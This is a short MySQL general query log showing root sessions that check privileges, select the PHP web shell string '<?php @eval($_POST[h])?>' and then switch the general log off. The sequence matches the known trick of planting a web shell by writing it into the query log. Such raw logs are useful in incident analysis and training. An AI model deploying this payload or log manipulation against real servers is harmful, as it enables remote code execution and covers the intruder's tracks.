MySQLa, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		20770 Init DB	mysql
		20770 Query	SHOW TABLES FROM `mysql`
		20770 Query	SHOW TABLE STATUS FROM `mysql`
		20770 Query	SELECT CURRENT_USER()
		20770 Query	SELECT `PRIVILEGE_TYPE` FROM `INFORMATION_SCHEMA`.`USER_PRIVILEGES` WHERE GRANTEE='''root''@''localhost''' AND PRIVILEGE_TYPE='EVENT'
		20770 Query	SELECT CURRENT_USER()
		20770 Query	SELECT `PRIVILEGE_TYPE` FROM `INFORMATION_SCHEMA`.`USER_PRIVILEGES` WHERE GRANTEE='''root''@''localhost''' AND PRIVILEGE_TYPE='TRIGGER'
		20770 Quit	
180610 23:24:10	20771 Connect	root@localhost on 
		20771 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		20771 Init DB	mysql
		20771 Init DB	mysql
		20771 Query	select '<?php @eval($_POST[h])?>'
		20771 Init DB	mysql
		20771 Query	SHOW TABLES FROM `mysql`
		20771 Query	SHOW TABLE STATUS FROM `mysql`
		20771 Query	SELECT CURRENT_USER()
		20771 Query	SELECT `PRIVILEGE_TYPE` FROM `INFORMATION_SCHEMA`.`USER_PRIVILEGES` WHERE GRANTEE='''root''@''localhost''' AND PRIVILEGE_TYPE='EVENT'
		20771 Query	SELECT CURRENT_USER()
		20771 Query	SELECT `PRIVILEGE_TYPE` FROM `INFORMATION_SCHEMA`.`USER_PRIVILEGES` WHERE GRANTEE='''root''@''localhost''' AND PRIVILEGE_TYPE='TRIGGER'
		20771 Query	SHOW VARIABLES LIKE 'profiling'
		20771 Query	SHOW TABLES
		20771 Quit	
180610 23:24:11	20772 Connect	root@localhost on 
		20772 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		20772 Init DB	mysql
180610 23:24:12	20772 Init DB	mysql
		20772 Query	set global general_log = 'Off'